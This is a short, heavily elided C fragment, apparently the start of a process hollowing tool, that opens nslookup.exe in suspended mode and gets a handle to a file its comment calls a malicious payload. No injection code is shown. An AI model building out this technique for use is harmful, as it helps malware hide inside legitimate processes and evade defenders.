...
int main() {
	...
	printf("[+] Opening Process nslookup.exe in suspended mode... \n");

	//  address of the target process here
	...
	// Getting Handle to malicious payload	
	hPayload = CreateFileA("C:\\temp\\payload.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
